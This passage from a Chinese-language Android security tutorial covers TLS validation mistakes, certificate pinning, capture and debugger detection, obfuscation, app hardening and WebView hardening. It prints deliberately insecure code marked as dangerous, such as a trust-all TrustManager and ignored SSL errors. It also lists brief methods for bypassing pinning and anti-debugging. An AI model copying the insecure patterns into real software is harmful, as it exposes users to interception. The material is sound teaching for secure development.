#### 漏洞1：信任所有证书
```java
// 危险代码：信任所有证书，完全绕过证书校验
private static void trustAllCertificates() throws Exception {
    TrustManager[] trustAllCerts = new TrustManager[]{
        new X509TrustManager() {
            public X509Certificate[] getAcceptedIssuers() {
                return new X509Certificate[0];
            }
            public void checkClientTrusted(X509Certificate[] certs, String authType) {}
            public void checkServerTrusted(X509Certificate[] certs, String authType) {
                // 不校验！任何证书都信任
            }
        }
    };
    
    SSLContext sc = SSLContext.getInstance("TLS");
    sc.init(null, trustAllCerts, new SecureRandom());
    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
}
```

#### 漏洞2：跳过主机名校验
```java
// 危险代码：不校验域名与证书是否匹配
HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {
    @Override
    public boolean verify(String hostname, SSLSession session) {
        return true;  // 任何域名都通过
    }
});
```

#### 漏洞3：WebView 忽略证书错误
```java
// 危险代码：WebView 遇到证书错误继续加载
webView.setWebViewClient(new WebViewClient() {
    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
        handler.proceed();  // 忽略证书错误，继续加载
    }
});
```

### 8.3 SSL Pinning（证书固定）

**原理**：将服务器的证书或公钥硬编码在客户端中，客户端只信任这个特定的证书，而不是系统信任的所有 CA 证书。

**作用**：防止中间人攻击（即使攻击者安装了自定义 CA 证书也无法抓包）

#### 实现方式1：OkHttp 证书固定
```java
// 使用 OkHttp 的 CertificatePinner
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("api.example.com", "sha256/abcdef123456...")  // 公钥哈希
    .add("api.example.com", "sha256/ghijkl789012...")  // 备用公钥哈希
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build();
```

#### 实现方式2：网络安全配置（Network Security Config）
```xml
<!-- res/xml/network_security_config.xml -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set>
            <pin digest="SHA-256">base64编码的公钥哈希值</pin>
            <pin digest="SHA-256">备用公钥哈希值</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

```xml
<!-- AndroidManifest.xml 中引用 -->
<application
    android:networkSecurityConfig="@xml/network_security_config">
</application>
```

### 8.4 抓包检测与对抗

#### 常见抓包方式
1. **代理抓包**：Charles、Burp Suite、Fiddler（需安装 CA 证书）
2. **VPN 抓包**：HttpCanary 等（通过 VPN 截获流量）
3. **TCP 层抓包**：tcpdump、Wireshark（需要 Root）

#### 代理检测
```java
// 检测系统代理设置
public static boolean isProxySet() {
    String proxyHost = System.getProperty("http.proxyHost");
    String proxyPort = System.getProperty("http.proxyPort");
    return proxyHost != null && proxyPort != null;
}
```

#### VPN 检测
```java
// 检测是否有 VPN 连接
public static boolean isVpnActive(Context context) {
    ConnectivityManager cm = (ConnectivityManager) 
            context.getSystemService(Context.CONNECTIVITY_SERVICE);
    Network[] networks = cm.getAllNetworks();
    for (Network network : networks) {
        NetworkCapabilities caps = cm.getNetworkCapabilities(network);
        if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
            return true;
        }
    }
    return false;
}
```

#### 抓包绕过方法
1. **安装系统级 CA 证书**（Android 7.0+ 只信任系统证书，用户证书默认不受信任）
2. **Frida Hook 绕过**：Hook 证书校验函数，使其总是返回通过
3. **使用 Magisk 模块**：将用户证书移动到系统证书目录
4. **VPN 抓包**：绕过代理检测

---

## 九、代码混淆与加固

### 9.1 代码混淆（ProGuard / R8）

#### 什么是代码混淆
代码混淆是通过修改类名、方法名、变量名为无意义的短名称，增加代码阅读难度，提高逆向分析成本的技术。

#### 混淆效果对比

**混淆前**：
```java
public class UserLoginTask {
    private String username;
    private String password;
    
    public boolean login(String user, String pass) {
        User user = findUserByUsername(user);
        if (user != null && user.getPassword().equals(encrypt(pass))) {
            SessionManager.setCurrentUser(user);
            return true;
        }
        return false;
    }
    
    private String encrypt(String input) {
        // 加密逻辑
        return MD5Util.md5(input + "salt_123");
    }
}
```

**混淆后**：
```java
public class a {
    private String a;
    private String b;
    
    public boolean a(String user, String pass) {
        User user = a.b(user);
        if (user != null && user.a().equals(b(pass))) {
            c.a(user);
            return true;
        }
        return false;
    }
    
    private String b(String input) {
        return d.a(input + "salt_123");
    }
}
```

#### 混淆配置（proguard-rules.pro）

```proguard
# 基础混淆配置
-optimizationpasses 5          # 优化次数
-dontusemixedcaseclassnames    # 不使用混合大小写类名
-dontskipnonpubliclibraryclasses
-dontpreverify                 # 不预校验
-verbose                       # 输出详细日志

# 优化策略
-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*

# 保留四大组件（不能混淆，否则清单文件找不到）
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider

# 保留自定义 View
-keep public class * extends android.view.View {
    public <init>(android.content.Context);
    public <init>(android.content.Context, android.util.AttributeSet);
    public <init>(android.content.Context, android.util.AttributeSet, int);
    public void set*(...);
}

# 保留 native 方法
-keepclasseswithmembernames class * {
    native <methods>;
}

# 保留枚举
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# 保留 Parcelable
-keep class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}

# 保留 Gson 序列化的类
-keep class com.example.model.** { *; }

# 移除 Log 调用
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
}
```

#### 混淆的局限性
- 只能增加阅读难度，不能真正保护代码
- 字符串常量仍然可见（硬编码的密钥等）
- 有经验的逆向工程师可以通过动态分析理解代码逻辑
- 资源文件无法混淆

### 9.2 应用加固

#### 加固的作用
- 防止反编译
- 防止二次打包
- 防调试
- 防 Hook
- 保护核心代码

#### 常见加固方案

| 加固类型 | 原理 | 安全性 | 性能影响 |
|----------|------|--------|----------|
| 整体加固（DEX 加固） | 加密 dex 文件，运行时解密加载 | 中 | 小 |
| 源码混淆 | 控制流扁平化、字符串加密等 | 中 | 小 |
| VMP 虚拟化 | 将 Java 代码转为自定义虚拟机指令 | 高 | 较大 |
| SO 加密/混淆 | 对 Native 代码加壳、虚拟化 | 高 | 较大 |

#### 加固原理（整体加固）

```
加固前 APK          加固后 APK
├── classes.dex     ├── classes.dex     ← 壳程序 dex（负责解密）
├── 业务代码        ├── lib/
└── 资源文件        │   └── libshell.so  ← 壳的 Native 代码
                    ├── assets/
                    │   └── classes.dex.enc  ← 加密后的业务 dex
                    └── 资源文件（可能加密）
```

**执行流程**：
1. 应用启动时，壳程序（StubApplication）先运行
2. 壳从 assets 中读取加密的 dex 文件
3. 解密 dex（密钥可能藏在 so 中）
4. 动态加载解密后的 dex
5. 调用真实的 Application，业务代码开始运行

#### 主流加固服务
- **腾讯乐固**：腾讯云提供的加固服务
- **360 加固**：360 提供的加固服务
- **梆梆安全**：专业移动安全厂商
- **爱加密**：移动安全服务提供商
- **百度加固**：百度提供的加固服务
- **网易易盾**：网易安全服务

### 9.3 防调试与反调试

#### 常见反调试手段

**1. 检测调试器连接**
```java
// 检测是否被调试
if (android.os.Debug.isDebuggerConnected()) {
    // 检测到调试器，退出应用
    System.exit(0);
}
```

**2. 检测 debuggable 标志**
```java
// 检测应用是否可调试
if ((getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0) {
    // 应用被修改为可调试
    System.exit(0);
}
```

**3. Native 层反调试**
```c
// 使用 ptrace 检测（Native 层）
#include <sys/ptrace.h>

int anti_debug() {
    // 尝试 attach 自己，如果失败说明已被调试
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
        // 检测到调试器
        return 1;
    }
    ptrace(PTRACE_DETACH, 0, 0, 0);
    return 0;
}
```

**4. 检测 Frida/Xposed**
- 检查特定的进程名、端口、文件
- 检查 Java 层是否有 Hook 框架的类
- 检测 Native 层是否有 Hook 库被加载

#### 反调试绕过方法
1. **Frida Hook**：Hook 反调试函数，使其返回正常值
2. **修改 Smali**：静态修改反调试判断逻辑
3. **调试器隐藏**：使用特殊调试器绕过检测
4. **Magisk 模块**：通过模块隐藏调试环境

---

## 十、WebView 安全

### 10.1 WebView 常见漏洞

#### 漏洞1：JavaScript 接口注入
```java
// 危险：addJavascriptInterface 可能导致远程代码执行
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsInterface(), "android");

class JsInterface {
    @JavascriptInterface
    public String getData() {
        return "data";
    }
}
// 攻击者可通过反射调用 Java 层方法
// 在 Android 4.2 之前存在远程代码执行漏洞
```

#### 漏洞2：File 域访问与跨域
```java
// 危险：允许 WebView 访问本地文件
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
// 攻击者可通过 file:// 协议读取本地文件
```

#### 漏洞3：明文密码存储
```java
// 危险：WebView 保存密码（已废弃但仍有应用使用）
webView.getSettings().setSavePassword(true);
// 密码会明文保存在 WebView 数据库中
```

### 10.2 WebView 安全配置

```java
WebSettings settings = webView.getSettings();

// 1. 禁用不必要的功能
settings.setJavaScriptEnabled(false);  // 不需要 JS 就禁用
settings.setAllowFileAccess(false);    // 禁用文件访问
settings.setAllowFileAccessFromFileURLs(false);
settings.setAllowUniversalAccessFromFileURLs(false);

// 2. 密码相关
settings.setSavePassword(false);       // 不保存密码

// 3. 缓存与存储
settings.setDomStorageEnabled(true);   // 根据需要开启
settings.setDatabaseEnabled(false);    // 禁用数据库

// 4. 内容安全
settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);

// 5. 证书错误处理
webView.setWebViewClient(new WebViewClient() {
    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, 
                                   SslError error) {
        handler.cancel();  // 证书错误时取消加载
    }
});
```

---

> 提示：Android 安全是一个持续学习的过程，建议结合 OWASP Mobile Top 10 和实际漏洞案例进行学习。
